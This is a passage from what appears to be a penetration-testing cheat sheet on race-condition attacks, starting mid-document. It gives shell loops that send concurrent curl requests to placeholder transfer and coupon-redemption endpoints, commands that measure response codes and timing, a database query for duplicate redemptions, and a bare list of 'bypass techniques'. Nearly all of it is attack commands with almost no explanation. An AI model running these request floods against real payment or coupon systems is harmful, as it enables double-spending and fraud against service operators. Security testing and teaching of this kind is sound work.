# Use connection pooling
for i in $(seq 1 20); do
    curl -s "https://target.com/transfer" &
done
wait

# Use HTTP/2 multiplexing
curl --http2 -s "https://target.com/transfer" &
```

### Analysis Commands
```
# Monitor successful requests
for i in $(seq 1 20); do
    curl -s -w "%{http_code}\n" "https://target.com/redeem" -o /dev/null
done | sort | uniq -c

# Analyze timing
for i in $(seq 1 100); do
    curl -s -w "%{time_total}\n" "https://target.com/redeem" -o /dev/null
done | sort -n | uniq -c

# Check for duplicates
mysql -u root -p -e "SELECT coupon_code, COUNT(*) FROM redemptions GROUP BY coupon_code HAVING COUNT(*) > 1;"
```

### Bypass Techniques
```
1. Connection pooling
2. HTTP/2 multiplexing
3. WebSocket connections
4. Server-Sent Events
5. Timing manipulation
6. Thread pool exploitation
7. Async/await patterns
8. Promise.all exploitation
```
